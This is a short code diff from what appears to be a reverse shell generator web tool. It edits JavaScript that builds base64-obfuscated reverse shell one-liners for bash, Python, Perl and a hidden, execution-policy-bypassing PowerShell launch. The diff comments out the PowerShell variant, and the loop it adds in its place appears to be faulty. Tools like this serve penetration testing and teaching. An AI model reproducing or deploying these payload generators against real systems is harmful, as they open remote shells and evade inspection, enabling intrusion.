@@ -407,7 +407,9 @@ const rsg = {
         document.querySelector(commandSelector).innerHTML = command;
         b64command = btoa(htmlRestore(command));
         document.getElementById("bash-b64-reverse-shell-command").innerHTML ="bash -c {echo,"+ b64command+"}|{base64,-d}|{bash,-i}";
-        document.getElementById("powershell-reverse-shell-command").innerHTML ='powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc '+ b64command;
+        //poshInput = ''
+        //for (var i = 0; i < b64command.length; i++) { poshInput += b64command + unescape("%00"); }
+        //document.getElementById("powershell-reverse-shell-command").innerHTML ='powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc '+ poshInput;
         document.getElementById("python-reverse-shell-command").innerHTML ="python -c exec('" + b64command + "'.decode('base64'))";
         document.getElementById("perl-reverse-shell-command").innerHTML ="perl -MMIME::Base64 -e eval(decode_base64('" + b64command + "'))";
     },
